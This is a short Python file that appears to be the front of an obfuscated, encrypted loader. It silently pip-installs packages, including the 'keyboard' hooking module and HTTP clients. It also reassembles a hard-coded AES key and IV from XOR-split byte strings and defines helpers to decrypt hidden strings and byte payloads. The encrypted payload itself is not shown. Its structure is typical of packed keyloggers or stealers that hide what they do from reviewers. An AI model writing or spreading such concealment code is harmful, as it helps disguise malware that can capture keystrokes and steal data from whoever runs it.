
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['ctypes', 'rich', 'asyncio', 'hashlib', 'os', 'datetime', 'keyboard', 'requests', 'subprocess', 'ujson', 'httpx']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b'N\xd9\xb5\xaf\xed\x94n\xeb2\x8dZ\x15\xf80\xe7h\xa3\x9f~\x90\x90c\xf1\x0fw#\x98\x0b3\t\xe0\x85', b'{\xbd\xcf\xa2b\xbe\xa7\xeb\x04\x95 \x98R\x92 \xeay\tM\xed\xf7\xfc\xcf\xfd\xf9\xb1]~8W\xd9\xf6', b'!\xc3\xc2\x03+p%%\x99\xe9Ren\xac!\x03\xf4@\x05\xbb\xa7\xfe^\xee\xf1\xa4\x99CP\xbd\x0ed'])
_I = _xor([b'\x15m%\xf0\xe01\xb3-L\xbf\x04\xd3\xb7y8\x1b', b'\xf8\x8b=\xc7\xfbj?k\xe3\xd7\xaf\xfd\x16\x85\xee#'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

